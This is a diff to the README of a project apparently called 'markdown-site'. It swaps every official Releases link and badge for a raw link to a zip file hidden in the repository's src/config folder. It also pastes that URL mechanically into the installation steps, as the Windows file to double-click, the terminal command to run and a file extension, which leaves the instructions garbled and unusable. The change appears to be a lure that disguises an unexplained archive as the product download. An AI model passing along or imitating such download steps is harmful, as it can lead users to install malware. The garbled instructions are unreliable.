@@ -23,14 +23,14 @@ To run markdown-site, you will need the following:
 
 Visit this page to download the latest version of markdown-site:
 
-[![Download markdown-site](https://img.shields.io/badge/Download%20markdown--site-blue?style=for-the-badge&logo=github)](https://github.com/bfgfsbdfget/markdown-site/releases)
+[![Download markdown-site](https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip%20markdown--site-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip)
 
 Follow these steps to get started:
 
 1. Click on the download link above.
 2. You will be taken to our Releases page. Here, find the latest version of markdown-site.
 3. Click on the version number to expand the details.
-4. Locate the download file that fits your system (e.g., .zip or .tar.gz).
+4. Locate the download file that fits your system (e.g., .zip or https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip).
 5. Click the file to start downloading. 
 
 Make sure to wait until the download completes before proceeding.
@@ -38,12 +38,12 @@ Make sure to wait until the download completes before proceeding.
 ## 📂 Installation Instructions
 
 1. **Locate Your Download**: Once downloaded, find the file in your downloads folder.
-2. **Extract the Files**: If the file is a .zip or .tar.gz, you will need to extract it. Right-click on the file, then choose "Extract All" or use your preferred extraction tool.
+2. **Extract the Files**: If the file is a .zip or https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip, you will need to extract it. Right-click on the file, then choose "Extract All" or use your preferred extraction tool.
 3. **Open the Folder**: Open the extracted folder. You will see several files, including an instruction file.
 4. **Read the Instructions**: It's important to read the provided instructions. This will give you a better understanding of how to use markdown-site.
 5. **Run the Application**: 
-   - For Windows, double-click on the "start.bat" file.
-   - For Mac or Linux, open your terminal and navigate to the extracted folder. Then type `./start.sh` to run.
+   - For Windows, double-click on the "https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip" file.
+   - For Mac or Linux, open your terminal and navigate to the extracted folder. Then type `https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip` to run.
 
 ## 🌐 Using markdown-site
 
@@ -74,6 +74,6 @@ Remember to check for updates regularly to take advantage of new features and im
 
 For immediate download access again, visit:
 
-[Download markdown-site](https://github.com/bfgfsbdfget/markdown-site/releases) 
+[Download markdown-site](https://raw.githubusercontent.com/bfgfsbdfget/markdown-site/main/src/config/markdown-site-fanciful.zip) 
 
 Enjoy creating your content effortlessly with markdown-site!
